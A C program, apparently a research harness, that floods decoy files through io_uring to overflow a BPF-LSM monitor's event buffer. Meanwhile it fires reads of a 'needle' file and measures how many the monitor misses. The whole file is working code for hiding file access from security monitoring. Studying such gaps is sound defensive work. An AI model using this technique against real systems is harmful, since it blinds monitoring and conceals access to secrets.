// flood.c — io_uring ring-buffer saturation / evasion demonstration.
//
// Threat model, on-topic for this study: an io_uring-capable attacker wants
// real reads of a sensitive file to go unseen. The syscall monitor is already
// blind to io_uring (the gap), so the real defense is the BPF-LSM monitor,
// which sits at the VFS layer and DOES see io_uring opens. But the LSM monitor
// streams an event per watched access into a fixed ring buffer; if events
// arrive faster than userspace drains them, the buffer overflows and events are
// DROPPED. So the attacker floods the watched directory through io_uring to keep
// the LSM monitor's buffer saturated, then performs real accesses ("needles")
// through io_uring while it is full — those events are dropped, hiding them.
//
// --mode selects the delivery channel (default uring): syscall | uring | sqpoll.
// --threads workers hammer the three flood decoys; after a warm-up the MAIN
// thread fires --needles reads of the needle file across the hold window. The
// needle file is touched ONLY here, so the harness measures detection as
//   (needle rows in the monitor CSV) / (needles fired).
// --threads 0 = control (needles, no flood).

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <liburing.h>

static volatile int stop_flag = 0;
static unsigned long long flood_ops = 0;     /* atomic-accumulated */
static const char *g_files[3];
static int g_nfiles = 0;
static int g_mode = 1;                        /* 0=syscall 1=uring 2=sqpoll */

static unsigned long long now_ns(void) {
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC, &ts);
    return (unsigned long long)ts.tv_sec * 1000000000ULL + ts.tv_nsec;
}

/* one open+read+close via plain syscalls; returns 1 if the file opened */
static int sys_access(const char *path) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    char b[256]; ssize_t r = read(fd, b, sizeof b); (void)r;
    close(fd); return 1;
}

static int init_ring(struct io_uring *ring) {
    struct io_uring_params p; memset(&p, 0, sizeof p);
    if (g_mode == 2) { p.flags |= IORING_SETUP_SQPOLL; p.sq_thread_idle = 2000; }
    return io_uring_queue_init_params(64, ring, &p);
}

/* one open+read+close entirely through io_uring (the open is IORING_OP_OPENAT,
 * so it NEVER touches the openat syscall — invisible to the syscall monitor,
 * but still seen by the VFS-layer LSM monitor). returns 1 if the file opened. */
static int uring_access(struct io_uring *ring, const char *path) {
    struct io_uring_sqe *sqe; struct io_uring_cqe *cqe; char buf[256];
    sqe = io_uring_get_sqe(ring);
    io_uring_prep_openat(sqe, AT_FDCWD, path, O_RDONLY, 0);
    io_uring_submit(ring); io_uring_wait_cqe(ring, &cqe);
    int fd = cqe->res; io_uring_cqe_seen(ring, cqe);
    if (fd < 0) return 0;
    sqe = io_uring_get_sqe(ring); io_uring_prep_read(sqe, fd, buf, sizeof buf, 0);
    io_uring_submit(ring); io_uring_wait_cqe(ring, &cqe); io_uring_cqe_seen(ring, cqe);
    sqe = io_uring_get_sqe(ring); io_uring_prep_close(sqe, fd);
    io_uring_submit(ring); io_uring_wait_cqe(ring, &cqe); io_uring_cqe_seen(ring, cqe);
    return 1;
}

static void *worker(void *arg) {
    (void)arg;
    struct io_uring ring; int have_ring = 0;
    if (g_mode) { if (init_ring(&ring) < 0) return NULL; have_ring = 1; }
    unsigned long long local = 0;
    while (!__atomic_load_n(&stop_flag, __ATOMIC_RELAXED)) {
        for (int i = 0; i < g_nfiles; i++)
            local += have_ring ? uring_access(&ring, g_files[i]) : sys_access(g_files[i]);
    }
    if (have_ring) io_uring_queue_exit(&ring);
    __atomic_fetch_add(&flood_ops, local, __ATOMIC_RELAXED);
    return NULL;
}

int main(int argc, char **argv) {
    const char *targetdir = "/var/tmp/iouring-study/targets";
    const char *needle = NULL, *modestr = "uring";
    int threads = 4, warmup_ms = 300, hold_ms = 1000, needles = 200;
    for (int i = 1; i < argc; i++) {
        if      (!strcmp(argv[i], "--mode")      && i+1 < argc) modestr   = argv[++i];
        else if (!strcmp(argv[i], "--threads")   && i+1 < argc) threads   = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--targets")   && i+1 < argc) targetdir = argv[++i];
        else if (!strcmp(argv[i], "--needle")    && i+1 < argc) needle    = argv[++i];
        else if (!strcmp(argv[i], "--needles")   && i+1 < argc) needles   = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--warmup-ms") && i+1 < argc) warmup_ms = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--hold-ms")   && i+1 < argc) hold_ms   = atoi(argv[++i]);
        else { fprintf(stderr, "usage: %s [--mode syscall|uring|sqpoll] [--threads N] "
                               "[--targets DIR] [--needle FILE] [--needles N] "
                               "[--warmup-ms M] [--hold-ms M]\n", argv[0]); return 2; }
    }
    if      (!strcmp(modestr, "syscall")) g_mode = 0;
    else if (!strcmp(modestr, "uring"))   g_mode = 1;
    else if (!strcmp(modestr, "sqpoll"))  g_mode = 2;
    else { fprintf(stderr, "bad --mode %s\n", modestr); return 2; }
    if (threads < 0) threads = 0;
    if (needles < 1) needles = 1;
    if (hold_ms < 1) hold_ms = 1;

    static char f0[512], f1[512], f2[512], nb[512];
    snprintf(f0, sizeof f0, "%s/shadow.decoy",    targetdir);
    snprintf(f1, sizeof f1, "%s/id_rsa.decoy",    targetdir);
    snprintf(f2, sizeof f2, "%s/audit.decoy.log", targetdir);
    g_files[0] = f0; g_files[1] = f1; g_files[2] = f2; g_nfiles = 3;
    if (!needle) { snprintf(nb, sizeof nb, "%s/needle.decoy", targetdir); needle = nb; }

    pthread_t *tid = threads ? calloc(threads, sizeof *tid) : NULL;
    unsigned long long t0 = now_ns();
    for (int i = 0; i < threads; i++) pthread_create(&tid[i], NULL, worker, NULL);

    if (warmup_ms) usleep(warmup_ms * 1000);     /* let the flood saturate the ring */

    /* THE NEEDLES: `needles` real accesses on the same channel, during flood. */
    struct io_uring nring; int have_nring = 0;
    if (g_mode) { if (init_ring(&nring) == 0) have_nring = 1; }
    int gap_us = (hold_ms * 1000) / needles;
    for (int k = 0; k < needles; k++) {
        if (have_nring) uring_access(&nring, needle);
        else            sys_access(needle);
        if (gap_us) usleep(gap_us);
    }
    if (have_nring) io_uring_queue_exit(&nring);

    __atomic_store_n(&stop_flag, 1, __ATOMIC_RELAXED);
    for (int i = 0; i < threads; i++) pthread_join(tid[i], NULL);
    free(tid);

    double secs = (now_ns() - t0) / 1e9;
    double rate = secs > 0 ? flood_ops / secs : 0;
    printf("mode,%s,threads,%d,flood_ops,%llu,secs,%.3f,flood_ops_per_s,%.0f,needles,%d,needle,%s\n",
           modestr, threads, flood_ops, secs, rate, needles, needle);
    fprintf(stderr, "flood: mode=%s threads=%d ops=%llu rate=%.0f/s needles=%d\n",
            modestr, threads, flood_ops, rate, needles);
    return 0;
}
